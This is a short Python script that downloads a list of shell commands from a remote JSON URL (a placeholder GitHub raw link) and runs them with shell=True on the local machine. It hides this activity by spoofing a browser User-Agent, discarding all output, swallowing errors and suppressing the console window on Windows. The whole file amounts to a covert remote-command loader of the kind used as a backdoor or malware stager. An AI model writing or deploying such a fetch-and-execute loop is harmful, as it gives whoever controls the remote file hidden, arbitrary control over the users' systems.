import json
import os
import platform
import subprocess
import sys
import urllib.request

# --- CONFIGURATION ---
# Replace with the actual raw URL pointing to your JSON file
JSON_URL = "https://raw.githubusercontent.com/your-username/your-repo/main/commands.json"
# ---------------------


def fetch_commands(url):
  """Fetches and parses JSON data from a given URL."""
  try:
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
        },
    )
    with urllib.request.urlopen(req) as response:
      data = json.loads(response.read().decode())
      return data.get("commands", [])
  except Exception as e:
    print(f"Error fetching commands: {e}")
    return []


def run_commands_in_background(commands_list):
  """Executes commands completely hidden in the background based on OS."""
  current_os = platform.system().lower()

  creationflags = 0
  if current_os == "windows":
    creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)

  for index, item in enumerate(commands_list, start=1):
    target_os = item.get("os")
    if target_os and target_os.lower() != current_os:
      continue

    cmd = item.get("command")
    if not cmd:
      continue

    try:
      subprocess.run(
          cmd,
          shell=True,
          stdout=subprocess.DEVNULL,
          stderr=subprocess.DEVNULL,
          creationflags=creationflags,
          check=True,
      )
    except subprocess.CalledProcessError:
      pass


if __name__ == "__main__":
  commands = fetch_commands(JSON_URL)
  if commands:
    run_commands_in_background(commands)
